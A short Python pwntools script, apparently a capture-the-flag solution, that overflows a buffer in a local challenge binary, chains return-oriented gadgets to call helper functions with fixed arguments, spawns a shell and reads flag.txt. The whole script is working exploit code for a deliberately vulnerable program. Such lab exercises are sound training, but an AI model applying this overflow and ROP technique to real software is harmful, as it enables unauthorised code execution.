from pwn import *

EXE_FILE = 'es'
exe = ELF(EXE_FILE)

POP_RET = 0x08049234  # pop; ret
POP_POP_RET = 0x08049233  # pop; pop; ret
ADD_BIN = 0x080491e5  # adress of add_bin
ADD_SH = 0x08049236  # adress of add_sh
EXEC_STRING = 0x080491b6  # adress of exec_string

# Buffer overflow until ebp
ropchain = b'A' * (108 + 4)

# Call add_bin(0xdeadbeef) gadget
ropchain += (p32(ADD_BIN) + p32(POP_RET) + p32(0xdeadbeef))

# Call add_sh(0xcafebabe, 0x0badf00d) gadget
ropchain += (p32(ADD_SH) + p32(POP_POP_RET) + p32(0xcafebabe) + p32(0x0badf00d))

ropchain += p32(EXEC_STRING)  # final call to exec_string

# print(ropchain)

# Executing the executable with ropchain as input
io = process([EXE_FILE, ropchain])

# To manually interact with the spawn shell
io.interactive()

# To automatically extract the flag
io.sendline(b'cat flag.txt')
print(io.recv().decode())
